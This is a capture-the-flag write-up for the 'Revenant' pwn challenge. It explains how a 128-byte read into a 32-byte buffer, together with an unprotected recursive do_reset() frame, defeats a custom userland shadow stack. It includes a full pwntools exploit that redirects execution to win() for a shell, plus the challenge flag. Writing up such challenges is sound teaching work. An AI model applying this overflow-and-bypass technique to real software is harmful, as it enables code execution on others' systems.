# Revenant — PWN Writeup

**CTF**: Midnight Flag
**Category**: PWN
**Author**: fun88337766
**Flag**: `MCTF{Wh4t_w4s_th4t_1d3a_t0_Cr3ate_a_userl4nd_sh4dow_st4ck??}`

---

## TL;DR

128-byte buffer overflow into a 32-byte buffer. The binary implements a userland shadow stack that protects the return address of `play()`, but `do_reset()` (which calls `play()` recursively) has no protection. We preserve `play()`'s return address to pass the verification and overwrite `do_reset()`'s return address with `win()`.

---

## Reconnaissance

```
ELF 64-bit LSB executable, x86-64, not stripped
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

Static binary at known addresses, no canary, no PIE. There is a `win()` function at `0x4012d6` that gives a shell.

---

## Analysis

### Program Structure

- `main()` → `shadow_stack_init()` → `play()`
- `play()` presents a menu with 5 options:
  1. Guess entities → `read(0, buf, 128)` into `buf[32]` **(BOF)**
  2. Stats
  3. Rename
  4. Die and restart → `do_reset()` → recursive `play()`
  0. Flee (exit)

### Shadow Stack

Custom userland implementation:
- `play()` calls `shadow_stack_push(return_address)` on entry
- `play()` calls `shadow_stack_pop(return_address)` on exit — if it doesn't match, calls `_exit(1)`
- The shadow stack memory is protected with `mprotect(PROT_READ)` between operations

### Vulnerability: CWE-121 (Stack Buffer Overflow)

```c
// game.c:51 — reads 128 bytes into a 32-byte buffer
read(0, buf, 128);
```

### The Bypass

`do_reset()` has no shadow stack push/pop:

```c
static void do_reset(void) {
    puts("...");
    nights = 0;
    new_night();
    play();  // recursive, no protection of its own
}
```

When `play()` is called recursively from `do_reset()`, the stack looks like:

```
[outer play frame]
[do_reset saved rbp]        ← NO shadow stack check
[do_reset ret addr]         ← NO shadow stack check
[inner play ret addr]       ← HAS shadow stack check
[inner play saved rbp]
[inner play locals: buf]    ← OVERFLOW FROM HERE
```

### Stack layout from `buf` (rbp-0x30)

| Offset | Contents | Action |
|--------|----------|--------|
| 0–47 | buf + padding | Filler |
| 48–55 | play saved rbp | Junk |
| 56–63 | play ret addr | **Preserve `0x4013b9`** (shadow stack OK) |
| 64–71 | do_reset saved rbp | Junk |
| 72–79 | do_reset ret addr | **Overwrite → `win()` = `0x4012d6`** |

---

## Exploit

```python
#!/usr/bin/env python3
from pwn import *

context.binary = './pub/game'

p = remote('dyn-02.midnightflag.fr', 13841)

win = 0x4012d6
play_ret_in_doreset = 0x4013b9

# Outer play — username
p.recvuntil(b'Survivor name:')
p.send(b'A' * 16)

# Option 4: die → do_reset() → recursive play()
p.recvuntil(b'> ')
p.sendline(b'4')

# Inner play — username
p.recvuntil(b'Survivor name:')
p.send(b'B' * 16)

# Option 1: trigger BOF
p.recvuntil(b'> ')
p.sendline(b'1')
p.recvuntil(b'(0-255):')

payload  = b'A' * 48               # padding to saved rbp
payload += p64(0xdeadbeef)         # play saved rbp (junk)
payload += p64(play_ret_in_doreset) # play ret addr (ORIGINAL — passes shadow stack)
payload += p64(0xcafebabe)         # do_reset saved rbp (junk)
payload += p64(win)                # do_reset ret addr → win()

p.send(payload)

# Exit inner play cleanly — shadow stack check passes
p.recvuntil(b'> ')
p.sendline(b'0')

# do_reset returns to win() → shell
import time
time.sleep(0.5)
p.sendline(b'cat flag.txt')
p.interactive()
```

---

## Execution

```
$ python3 exploit.py
[+] Opening connection to dyn-02.midnightflag.fr on port 13841: Done
[*] Switching to interactive mode
You found the light you were looking for. You are saved!
$ MCTF{Wh4t_w4s_th4t_1d3a_t0_Cr3ate_a_userl4nd_sh4dow_st4ck??}
```

---

## Key Lessons

1. **Userland shadow stacks are bypassable** if they don't protect every function in the call chain. A single unprotected intermediate function is enough to use as a trampoline.
2. **Recursion + BOF** = ability to overwrite frames of ancestor functions on the call stack.
3. No PIE + known `win()` = no leak needed, only control flow redirection.

---

## References

- CWE-121: Stack-based Buffer Overflow
- Shadow Stack bypass techniques
